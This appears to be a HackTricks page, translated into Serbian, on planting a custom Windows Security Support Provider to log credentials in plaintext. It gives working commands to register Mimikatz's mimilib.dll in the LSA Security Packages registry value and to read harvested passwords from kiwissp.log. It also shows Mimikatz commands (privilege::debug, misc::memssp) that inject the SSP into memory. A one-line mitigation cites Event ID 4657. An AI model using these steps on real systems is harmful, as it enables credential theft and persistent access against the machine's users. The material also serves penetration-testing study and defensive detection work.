# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Možete kreirati **svoj SSP** da **zabeležite** u **čistom tekstu** **akreditive** korišćene za pristup mašini.

#### Mimilib

Možete koristiti `mimilib.dll` binarni fajl koji pruža Mimikatz. **Ovo će zabeležiti sve akreditive u čistom tekstu unutar fajla.**\
Postavite dll u `C:\Windows\System32\`\
Dobijte listu postojećih LSA sigurnosnih paketa:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodajte `mimilib.dll` na listu pružatelja bezbednosti (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
I nakon ponovnog pokretanja, sve akreditive možete pronaći u čistom tekstu u `C:\Windows\System32\kiwissp.log`

#### U memoriji

Takođe možete ovo injektovati direktno u memoriju koristeći Mimikatz (imajte na umu da može biti malo nestabilno/ne radi).
```powershell
privilege::debug
misc::memssp
```
Ovo neće preživeti ponovna pokretanja.

#### Ublažavanje

Event ID 4657 - Revizija kreiranja/promene `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
